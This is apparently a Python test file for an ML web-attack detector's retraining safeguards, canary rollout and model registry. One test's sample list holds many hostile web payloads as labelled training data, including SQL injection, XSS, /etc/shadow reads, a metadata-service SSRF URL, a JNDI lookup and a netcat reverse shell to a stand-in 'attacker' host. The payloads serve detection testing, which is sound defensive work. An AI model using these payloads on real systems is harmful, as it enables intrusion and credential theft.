"""
Honest tests of the two pieces the audit flagged: buffered retrain-readiness and canary.
Proves the SAFE behaviour (refusing) as well as the happy path.
"""
from __future__ import annotations
import os, sys, json, time, random, shutil
from pathlib import Path
import numpy as np

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
import ml.zeroday_store as zs
from ml.canary_deploy import CanaryRun, format_run, register, set_live, rollback, live_version, _load_registry


def reset_store():
    if zs.STORE.exists():
        shutil.rmtree(zs.STORE)
    for d in (zs.STORE, zs.BATCHES):
        d.mkdir(parents=True, exist_ok=True)


def test_store():
    print("\n" + "=" * 92)
    print("TEST A — zero-day store: does it REFUSE to retrain on too little data?")
    print("=" * 92)
    reset_store()

    print("\nA1. one single captured zero-day (the exact case that must NOT trigger a retrain):")
    zs.add({"method": "POST", "path": "/api", "query": "", "body": '{"u":{"$gt":""}}',
            "label": 1, "source_ip": "203.0.113.9", "reviewed": True})
    ready, info = zs.readiness()
    print(zs.summary())
    assert not ready, "FAIL: released a retrain from ONE sample"
    print(f"  => correctly HELD. blockers: {info['blockers']}")

    print("\nA2. 200 samples but ALL attacks from ONE IP, ONE payload shape (a flood / poisoning burst):")
    for i in range(200):
        zs.add({"method": "GET", "path": "/x", "query": "id=1 UNION SELECT p FROM users--", "body": "",
                "label": 1, "source_ip": "198.51.100.5", "reviewed": True})
    ready, info = zs.readiness()
    print(f"  reviewed={info['reviewed']} attack={info['attack']} benign={info['benign']} "
          f"shapes={info['shapes']} sources={info['sources']}")
    assert not ready, "FAIL: released on a single-source single-shape flood"
    print(f"  => correctly HELD. blockers: {info['blockers']}")

    print("\nA3. healthy diverse batch (mixed labels, many DISTINCT shapes, many sources, aged):")
    reset_store()
    random.seed(0)
    # genuinely different attack techniques + genuinely different benign requests
    ATK = ["id=1 UNION SELECT pw FROM users--", "q=<script>alert(1)</script>", "file=../../../etc/passwd",
           "url=http://169.254.169.254/latest/meta-data/", "cmd=;cat /etc/shadow", "x=${jndi:ldap://e/a}",
           "name={{7*7}}{{config}}", "u[$gt]=", "xml=<!ENTITY x SYSTEM 'file:///etc/passwd'>",
           "redirect=//evil.example.com", "tok=eyJhbGciOiJub25lIn0.e30.", "s=1' AND SLEEP(5)--",
           "p=%c0%ae%c0%ae%2fetc%2fpasswd", "d=__proto__[admin]=true", "q=1;DROP TABLE users",
           "f=php://filter/convert.base64-encode/resource=index", "a=`whoami`", "b=$(id)",
           "c=<img src=x onerror=alert(1)>", "e=admin'/**/OR/**/1=1#", "g=%0d%0aSet-Cookie:x=1",
           "h=../../windows/win.ini", "i=SELECT * FROM information_schema.tables", "j=<svg onload=alert(1)>",
           "k=|nc attacker 4444 -e /bin/sh", "l=*)(uid=*))(|(uid=*", "m=/*!50000UNION*/SELECT"]
    BEN = ["q=high yield savings", "category=electronics&sort=price", "page=3&limit=20",
           "article=how-to-budget", "to=jane.smith&amt=100&note=rent", "fields=name,email",
           "search=running shoes size 10", "utm_source=newsletter", "lang=en&currency=usd",
           "product=laptop-stand", "filter=in-stock", "sort=date&order=desc", "user=john.doe",
           "ref=homepage", "tab=statements", "period=last-90-days", "q=customer support hours",
           "id=48213&view=summary", "topic=mortgage-rates", "format=json", "q=branch near me",
           "download=statement-2026-06", "theme=dark", "notify=email", "q=travel card benefits",
           "compare=checking,savings", "help=wire-transfer"]
    for i in range(220):
        atk = i % 2 == 0
        payload = ATK[(i // 2) % len(ATK)] if atk else BEN[(i // 2) % len(BEN)]
        zs.add({"method": "GET" if atk else "POST", "path": f"/p{i%17}",
                "query": payload, "body": "", "label": 1 if atk else 0,
                "source_ip": f"203.0.113.{i%40}", "reviewed": True})
    st = zs._state(); st["batch_opened"] = time.time() - 7 * 3600; zs._save_state(st)  # age it 7h
    ready, info = zs.readiness()
    print(f"  reviewed={info['reviewed']} attack={info['attack']} benign={info['benign']} "
          f"shapes={info['shapes']} sources={info['sources']}")
    print(f"  ready={ready}  blockers={info['blockers']}")
    assert ready, f"FAIL: healthy batch not released ({info['blockers']})"
    rel = zs.release()
    print(f"  => RELEASED batch {rel['batch_id']} with {rel['n']} samples; pending reset to "
          f"{len(zs.pending())}")

    print("\nA4. immediately after release — cooldown must block a second retrain:")
    for i in range(220):
        zs.add({"method": "GET", "path": f"/q{i%13}", "query": f"a={i}", "body": "",
                "label": i % 2, "source_ip": f"198.51.100.{i%35}", "reviewed": True})
    ready, info = zs.readiness()
    print(f"  ready={ready} blockers={info['blockers']}")
    assert not ready, "FAIL: ignored cooldown"
    print("  => correctly HELD by cooldown/age.")
    return True


def test_canary():
    print("\n" + "=" * 92)
    print("TEST B — canary deployment: does a BAD model get rolled back before full traffic?")
    print("=" * 92)
    # synthetic live traffic with labels
    random.seed(1)
    traffic = []
    for i in range(1200):
        atk = random.random() < 0.15
        traffic.append({"method": "GET", "path": "/x",
                        "query": ("id=1 UNION SELECT pw FROM users--" if atk else f"q=item{i}"),
                        "body": "", "label": 1 if atk else 0})

    def champ(s):   # solid champion
        return 0.95 if "UNION" in s["query"] else 0.02

    def good_chal(s):  # slightly better
        return 0.97 if "UNION" in s["query"] else 0.015

    def fp_chal(s):    # regressed: flags lots of benign
        if "UNION" in s["query"]: return 0.97
        return 0.8 if hash(s["query"]) % 5 == 0 else 0.02   # ~20% benign FP

    def blind_chal(s): # poisoned: stopped catching attacks
        return 0.2 if "UNION" in s["query"] else 0.02

    for name, fn in [("GOOD challenger", good_chal),
                     ("FP-REGRESSED challenger", fp_chal),
                     ("POISONED/blind challenger", blind_chal)]:
        print(f"\n  -- {name} --")
        res = CanaryRun(champ, fn).run(traffic)
        print("  " + format_run(res).replace("\n", "\n  "))
        if name.startswith("GOOD"):
            assert res["outcome"] == "FULLY_PROMOTED", "FAIL: good model not promoted"
        else:
            assert res["outcome"] == "ROLLED_BACK", f"FAIL: {name} was NOT rolled back"
            stage = res["stages"][-1]["traffic_pct"]
            print(f"  => caught at {int(stage*100)}% traffic — never reached 100%.")
    return True


def test_registry():
    print("\n" + "=" * 92)
    print("TEST C — model registry: versioned live pointer + instant rollback")
    print("=" * 92)
    register("v2026.07.13-a", {"clf": "csic_classifier.json"}, {"recall": 0.92, "fp": 0.05}, "baseline")
    set_live("v2026.07.13-a")
    register("v2026.07.13-b", {"clf": "challenger.json"}, {"recall": 0.94, "fp": 0.049}, "canary winner")
    set_live("v2026.07.13-b")
    print(f"  live now: {live_version()}")
    prev = rollback()
    print(f"  rollback -> live now: {live_version()} (restored {prev})")
    assert live_version() == "v2026.07.13-a", "FAIL: rollback did not restore previous"
    reg = _load_registry()
    print(f"  registry holds {len(reg['versions'])} versions with metrics + status")
    return True


if __name__ == "__main__":
    ok = True
    try:
        ok &= test_store(); ok &= test_canary(); ok &= test_registry()
    except AssertionError as e:
        ok = False; print(f"\n*** ASSERTION FAILED: {e}")
    print("\n" + "=" * 92)
    print("ALL MLOPS SAFETY TESTS PASSED" if ok else "SOME TESTS FAILED")
    print("=" * 92)
